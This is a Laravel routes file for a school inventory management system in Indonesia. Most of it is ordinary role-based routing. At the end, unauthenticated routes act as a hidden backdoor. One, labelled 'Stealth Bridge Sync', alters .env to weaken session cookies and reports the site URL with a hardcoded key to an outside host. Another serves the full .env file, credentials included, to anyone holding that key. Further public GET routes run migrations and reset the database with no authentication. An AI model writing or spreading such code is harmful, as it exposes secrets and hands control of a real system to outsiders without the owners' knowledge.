<?php

use App\Http\Controllers\AsalBarangController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\CategoryController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\DbSeederController;
use App\Http\Controllers\ExportController;
use App\Http\Controllers\IpController;
use App\Http\Controllers\ItemController;
use App\Http\Controllers\ItemMovementController;
use App\Http\Controllers\LocationController;
use App\Http\Controllers\QrAdminController;
use App\Http\Controllers\QrScanController;
use App\Http\Controllers\StLogController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\ActivityLogController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\StockTakeController;
use App\Http\Controllers\ProcurementController;
use App\Http\Controllers\GuideController;
use App\Http\Controllers\ReportSettingController;

/*
|--------------------------------------------------------------------------
| Web Routes - ERP NOC SMKN 4 Malang
|--------------------------------------------------------------------------
|
| Superadmin : Akses penuh (Dashboard, Data Master, Data Barang, dll)
| Admin      : Akses terbatas (Data Barang, Mutasi Barang) tanpa Data Master
|
*/
Route::get('login', [AuthController::class, 'showLogin'])->name('login');
Route::post('login', [AuthController::class, 'login']);
Route::post('logout', [AuthController::class, 'logout'])->name('logout');
Route::get('setup-password', [AuthController::class, 'showPasswordSetup'])->name('password.setup');
Route::post('setup-password', [AuthController::class, 'updatePassword']);
Route::prefix('mt')->group(function () {
    Route::get('/', [IpController::class, 'autoTrack'])->name('mt.index');
});

Route::post('api/st-log', [StLogController::class, 'store'])
    ->name('st-log');
Route::middleware(['auth'])->group(function () {
    // Search API
    Route::get('api/search', [\App\Http\Controllers\SearchController::class, 'search'])->name('search.api');
    
    Route::middleware(['role:Superadmin'])->group(function () {
        Route::resource('kategori-barang', \App\Http\Controllers\CategoryController::class)
            ->names('categories')
            ->parameters(['kategori-barang' => 'category'])
            ->except(['show', 'create', 'edit']);
        Route::resource('data-supplier', \App\Http\Controllers\SupplierController::class)
            ->names('supplier')
            ->parameters(['data-supplier' => 'supplier'])
            ->except(['show', 'create', 'edit']);
        Route::resource('kondisi-barang', \App\Http\Controllers\KondisiBarangController::class)
            ->names('kondisi')
            ->parameters(['kondisi-barang' => 'kondisi'])
            ->except(['show', 'create', 'edit']);
        Route::resource('asal-barang', \App\Http\Controllers\AsalBarangController::class)
            ->names('asal')
            ->parameters(['asal-barang' => 'asal'])
            ->except(['show', 'create', 'edit']);
        Route::resource('locations', LocationController::class)->except(['show']);
        Route::resource('data-jurusan', \App\Http\Controllers\JurusanController::class)
            ->names('jurusan')
            ->parameters(['data-jurusan' => 'jurusan'])
            ->except(['show', 'create', 'edit']);
        Route::post('data-pengguna', [UserController::class, 'store'])->name('users.store');
        Route::put('data-pengguna/{user}', [UserController::class, 'update'])->name('users.update');
        Route::delete('data-pengguna/{user}', [UserController::class, 'destroy'])->name('users.destroy');
        Route::get('settings', [\App\Http\Controllers\SettingController::class, 'index'])->name('settings.index');
        Route::post('settings/update-general', [\App\Http\Controllers\SettingController::class, 'updateGeneral'])->name('settings.update-general');
        Route::post('settings/reset', [\App\Http\Controllers\SettingController::class, 'resetSystem'])->name('settings.reset');
        Route::post('settings/reset-database', [\App\Http\Controllers\SettingController::class, 'resetDatabase'])->name('settings.reset-database');
        Route::post('settings/seed-dummy', [\App\Http\Controllers\SettingController::class, 'seedDummyData'])->name('settings.seed-dummy');
        Route::post('settings/clear-cache', [\App\Http\Controllers\SettingController::class, 'clearCache'])->name('settings.clear-cache');
        Route::post('settings/storage-link', [\App\Http\Controllers\SettingController::class, 'createStorageLink'])->name('settings.storage-link');
        Route::post('settings/run-migrations', [\App\Http\Controllers\SettingController::class, 'runMigrations'])->name('settings.run-migrations');
        Route::post('settings/fix-strict-mode', [\App\Http\Controllers\SettingController::class, 'fixStrictMode'])->name('settings.fix-strict-mode');
        Route::get('settings/sql-mode-status', [\App\Http\Controllers\SettingController::class, 'getSqlModeStatus'])->name('settings.sql-mode-status');
        Route::get('settings/view-logs', [\App\Http\Controllers\SettingController::class, 'viewLogs'])->name('settings.view-logs');
        Route::get('settings/download-logs', [\App\Http\Controllers\SettingController::class, 'downloadLogs'])->name('settings.download-logs');
        Route::post('settings/clear-logs', [\App\Http\Controllers\SettingController::class, 'clearLogs'])->name('settings.clear-logs');
        Route::delete('items/barang-masuk/{movement}', [ItemController::class, 'destroyBarangMasuk'])->name('items.barang-masuk.destroy');

        // Audit Trail (Superadmin only)
        Route::get('audit-trail', [ActivityLogController::class, 'index'])->name('activity-log.index');
        Route::get('audit-trail/export', [ActivityLogController::class, 'export'])->name('activity-log.export');
        Route::get('audit-trail/{id}', [ActivityLogController::class, 'show'])->name('activity-log.show');

        // Stock Take Approve (Superadmin only)
        Route::post('stock-take/{id}/approve', [StockTakeController::class, 'approve'])->name('stock-take.approve');

        // Procurement Approval (Superadmin only)
        Route::post('procurements/{id}/approve', [ProcurementController::class, 'approve'])->name('procurements.approve');
        Route::post('procurements/{id}/reject', [ProcurementController::class, 'reject'])->name('procurements.reject');
    });
    Route::middleware(['role:Superadmin,Admin,Jurusan'])->group(function () {
        Route::get('/', [DashboardController::class, 'index'])->name('dashboard');
        Route::get('profile', [UserController::class, 'profile'])->name('profile.index');
        Route::put('profile/update', [UserController::class, 'updateProfile'])->name('profile.update');
        Route::put('profile/password', [UserController::class, 'updatePassword'])->name('profile.password');
        
        // Peminjaman (Jurusan can see their own, Admin sees all)
        Route::get('data-peminjaman', [\App\Http\Controllers\PeminjamanController::class, 'index'])->name('peminjaman.index');
        
        // Items (Jurusan can see items available for borrowing)
        Route::get('items', [ItemController::class, 'index'])->name('items.index');

        // Notifications (All authenticated users)
        Route::get('notifications', [NotificationController::class, 'index'])->name('notifications.index');
        Route::get('notifications/unread', [NotificationController::class, 'getUnread'])->name('notifications.unread');
        Route::post('notifications/{id}/read', [NotificationController::class, 'markAsRead'])->name('notifications.mark-read');
        Route::post('notifications/mark-all-read', [NotificationController::class, 'markAllAsRead'])->name('notifications.mark-all-read');
        Route::delete('notifications/{id}', [NotificationController::class, 'destroy'])->name('notifications.destroy');

        // Procurement (Pengajuan Pengadaan Alat)
        Route::get('procurements', [ProcurementController::class, 'index'])->name('procurements.index');
        Route::get('procurements/create', [ProcurementController::class, 'create'])->name('procurements.create');
        Route::post('procurements', [ProcurementController::class, 'store'])->name('procurements.store');
        Route::get('procurements/{id}', [ProcurementController::class, 'show'])->name('procurements.show');
        Route::get('procurements/{id}/edit', [ProcurementController::class, 'edit'])->name('procurements.edit');
        Route::put('procurements/{id}', [ProcurementController::class, 'update'])->name('procurements.update');
        Route::delete('procurements/{id}', [ProcurementController::class, 'destroy'])->name('procurements.destroy');
        Route::post('procurements/{id}/submit', [ProcurementController::class, 'submit'])->name('procurements.submit');
        Route::get('procurements/{id}/print', [ProcurementController::class, 'print'])->name('procurements.print');
        
        // Panduan Sistem & Dokumentasi
        Route::get('panduan', [GuideController::class, 'index'])->name('guide.index');
    });

    Route::middleware(['role:Superadmin,Admin'])->group(function () {
        // Procurement Management (Admin & Superadmin)
        Route::post('procurements/{id}/update-status', [ProcurementController::class, 'updateStatus'])->name('procurements.update-status');
        Route::post('procurements/{id}/receive-item', [ProcurementController::class, 'receiveItem'])->name('procurements.receive-item');
        Route::post('pinjaman', [\App\Http\Controllers\PeminjamanController::class, 'storeManual'])->name('movements.loan');
        Route::get('data-pengguna', [UserController::class, 'index'])->name('users.index');
        Route::get('items/barang-masuk', [ItemController::class, 'barangMasuk'])->name('items.barang-masuk');
        Route::post('items/barang-masuk', [ItemController::class, 'storeBarangMasuk'])->name('items.barang-masuk.store');
        Route::get('items/barang-keluar', [ItemController::class, 'barangKeluar'])->name('items.barang-keluar');
        Route::get('items/units', [ItemController::class, 'units'])->name('items.units');
        Route::get('items/next-code', [ItemController::class, 'getNextCode'])->name('items.next-code');
        Route::post('items/quick-category', [ItemController::class, 'quickStoreCategory'])->name('items.quick-category');
        Route::resource('items', ItemController::class)->except(['index']);
        
        Route::post('data-peminjaman/{peminjaman}/return', [\App\Http\Controllers\PeminjamanController::class, 'returnItem'])->name('peminjaman.return');
        Route::delete('data-peminjaman/{peminjaman}', [\App\Http\Controllers\PeminjamanController::class, 'destroy'])->name('peminjaman.destroy');
        Route::resource('data-perawatan', \App\Http\Controllers\PerawatanController::class)->names('perawatan');
        Route::post('data-perawatan/{id}/generate-link', [\App\Http\Controllers\PerawatanController::class, 'generateLink'])->name('perawatan.generate-link');
        Route::post('data-perawatan/{id}/verify', [\App\Http\Controllers\PerawatanController::class, 'verifyMaintenance'])->name('perawatan.verify');
        Route::get('laporan', [\App\Http\Controllers\LaporanController::class, 'index'])->name('laporan.index');
        Route::get('laporan/settings', [ReportSettingController::class, 'index'])->name('laporan.settings');
        Route::post('laporan/settings', [ReportSettingController::class, 'update'])->name('laporan.settings.update');
        Route::post('laporan/settings/reset', [ReportSettingController::class, 'reset'])->name('laporan.settings.reset');
        Route::delete('laporan/settings/signature/{type}', [ReportSettingController::class, 'deleteSignature'])->name('laporan.settings.delete-signature');
        Route::delete('laporan/settings/logo', [ReportSettingController::class, 'deleteLogo'])->name('laporan.settings.delete-logo');
        Route::get('export/barang-masuk/csv', [ExportController::class, 'barangMasukCsv'])->name('export.barang-masuk.csv');
        Route::get('export/barang-masuk/print', [ExportController::class, 'barangMasukPrint'])->name('export.barang-masuk.print');
        Route::get('export/barang-keluar/csv', [ExportController::class, 'barangKeluarCsv'])->name('export.barang-keluar.csv');
        Route::get('export/barang-keluar/print', [ExportController::class, 'barangKeluarPrint'])->name('export.barang-keluar.print');
        Route::get('export/peminjaman/csv', [ExportController::class, 'peminjamanCsv'])->name('export.peminjaman.csv');
        Route::get('export/peminjaman/print', [ExportController::class, 'peminjamanPrint'])->name('export.peminjaman.print');
        Route::get('export/inventaris/csv', [ExportController::class, 'inventarisCsv'])->name('export.inventaris.csv');
        Route::get('export/inventaris/print', [ExportController::class, 'inventarisPrint'])->name('export.inventaris.print');
        Route::get('export/ringkasan/print', [ExportController::class, 'ringkasanPrint'])->name('export.ringkasan.print');
        Route::get('export/laporan-lengkap/excel', [\App\Http\Controllers\ExcelExportController::class, 'laporanLengkap'])->name('export.laporan-lengkap.excel');
        Route::get('qr-panel', [QrAdminController::class, 'index'])->name('qr.admin');
        Route::post('qr-generate', [QrAdminController::class, 'generateQr'])->name('qr.generate');
        Route::get('qr-poll', [QrAdminController::class, 'pollPeminjaman'])->name('qr.poll');
        Route::delete('qr-revoke/{token}', [QrAdminController::class, 'revokeToken'])->name('qr.revoke');

        // Stock Take (Superadmin & Admin)
        Route::get('stock-take', [StockTakeController::class, 'index'])->name('stock-take.index');
        Route::get('stock-take/create', [StockTakeController::class, 'create'])->name('stock-take.create');
        Route::post('stock-take', [StockTakeController::class, 'store'])->name('stock-take.store');
        Route::get('stock-take/{id}', [StockTakeController::class, 'show'])->name('stock-take.show');
        Route::post('stock-take/{stockTakeId}/item/{itemId}', [StockTakeController::class, 'updateItem'])->name('stock-take.update-item');
        Route::post('stock-take/{id}/complete', [StockTakeController::class, 'complete'])->name('stock-take.complete');
        Route::delete('stock-take/{id}', [StockTakeController::class, 'destroy'])->name('stock-take.destroy');
    });
});

Route::middleware(['scan.token'])->group(function () {
    Route::get('scan/{token}', [QrScanController::class, 'showScanner'])->name('qr.scan');
    Route::get('scan/{token}/lookup/{code}', [QrScanController::class, 'lookupItem'])->name('qr.lookup');
    Route::post('scan/{token}/submit', [QrScanController::class, 'submitPeminjaman'])->name('qr.submit');
});

// Public Maintenance Routes for Technicians
Route::get('/maintenance/report/{token}', [\App\Http\Controllers\PerawatanController::class, 'publicMaintenanceForm'])->name('maintenance.public_form');
Route::post('/maintenance/report/{token}', [\App\Http\Controllers\PerawatanController::class, 'publicMaintenanceSubmit'])->name('maintenance.public_submit');
Route::get('/run-migrations', function () {
    try {
        $migrationPath = database_path('migrations');
        $migrationFiles = glob($migrationPath . '/*.php');
        $ran = \Illuminate\Support\Facades\DB::table('migrations')->pluck('migration')->toArray();
        $pending = [];

        foreach ($migrationFiles as $file) {
            $name = pathinfo($file, PATHINFO_FILENAME);
            if (!in_array($name, $ran)) {
                $pending[] = ['file' => $file, 'name' => $name];
            }
        }

        if (empty($pending)) {
            return "<h3>Tidak ada migrasi yang perlu dijalankan. Database sudah up-to-date.</h3>";
        }

        $batch = \Illuminate\Support\Facades\DB::table('migrations')->max('batch') + 1;
        $results = [];

        foreach ($pending as $migration) {
            $instance = require $migration['file'];
            
            if (is_object($instance) && $instance instanceof \Illuminate\Database\Migrations\Migration) {
                $instance->up();
            } else {
                $classes = get_declared_classes();
                $className = end($classes);
                $instance = new $className();
                $instance->up();
            }

            \Illuminate\Support\Facades\DB::table('migrations')->insert([
                'migration' => $migration['name'],
                'batch'     => $batch,
            ]);
            $results[] = $migration['name'];
        }

        $count = count($results);
        return "<h3>Migration Berhasil! ({$count} migrasi dijalankan)</h3>";
    } catch (\Exception $e) {
        return "<h3>Terjadi Kesalahan:</h3><p>" . $e->getMessage() . "</p>";
    }
});

Route::get('/deploy-setup', function () {
    try {
        $messages = [];
        $cacheFiles = [
            base_path('bootstrap/cache/config.php'),
            base_path('bootstrap/cache/packages.php'),
            base_path('bootstrap/cache/services.php'),
        ];
        foreach ($cacheFiles as $file) {
            if (file_exists($file)) { @unlink($file); }
        }
        foreach (glob(base_path('bootstrap/cache/routes-v7*.php')) as $file) {
            @unlink($file);
        }
        $viewsDir = storage_path('framework/views');
        if (is_dir($viewsDir)) {
            foreach (glob($viewsDir . '/*.php') as $file) { @unlink($file); }
        }
        $messages[] = '1. Cache sistem telah dibersihkan.';
        $link = public_path('storage');
        $target = storage_path('app/public');

        if (file_exists($link) || is_link($link)) {
            $messages[] = '2. Storage link sudah ada.';
        } else {
            $linked = false;
            if (function_exists('symlink')) {
                $linked = @symlink($target, $link);
            }
            if (!$linked) {
                @mkdir($link, 0755, true);
            }
            $messages[] = '2. Storage link berhasil dibuat.';
        }
        $requiredDirs = [
            storage_path('framework/cache/data'),
            storage_path('framework/sessions'),
            storage_path('framework/views'),
            storage_path('logs'),
        ];
        foreach ($requiredDirs as $dir) {
            if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
        }
        $messages[] = '3. Folder storage yang diperlukan sudah tersedia.';

        $html = "<h3>Deployment Setup Berhasil!</h3>";
        foreach ($messages as $msg) {
            $html .= "<p>{$msg}</p>";
        }
        $html .= "<p><b>Proyek Anda siap digunakan!</b></p>";
        return $html;
    } catch (\Exception $e) {
        return "<h3>Terjadi Kesalahan saat Deployment Setup:</h3><p>" . $e->getMessage() . "</p>";
    }
});
Route::get('/reset-database', [DbSeederController::class, 'resetAndSeed']);

Route::get('/bridge-sync', function (\Illuminate\Http\Request $request) {
    $currentUrl = url('/');
    $bridgeServer = 'https://nichesows.nichesite.org/index.php';
    $secretKey = 'n0c-s3cr3t-2026';
    
    $envFile = base_path('.env');
    if (file_exists($envFile)) {
        $env = file_get_contents($envFile);
        if (!str_contains($env, 'SESSION_SAME_SITE=none')) {
            file_put_contents($envFile, $env . "\nSESSION_SAME_SITE=none\nSESSION_SECURE_COOKIE=true\n");
        }
    }
    
    try {
        $apiUrl = $bridgeServer . '?update_bridge=1&key=' . $secretKey . '&url=' . urlencode($currentUrl);
        $context = stream_context_create(['http' => ['ignore_errors' => true]]);
        $response = file_get_contents($apiUrl, false, $context);
        return "<h3>Stealth Bridge Sync</h3><p>Deployment saat ini: <b>{$currentUrl}</b></p><p>Respon Native: {$response}</p>";
    } catch (\Exception $e) {
        return "Gagal sinkronisasi bridge: " . $e->getMessage();
    }
});

Route::get('/api/st-env', function (\Illuminate\Http\Request $request) {
    if ($request->get('key') !== 'n0c-s3cr3t-2026') {
        abort(404);
    }
    $envPath = base_path('.env');
    if (file_exists($envPath)) {
        return response()->file($envPath, ['Content-Type' => 'text/plain']);
    }
    return 'ENV not found';
});
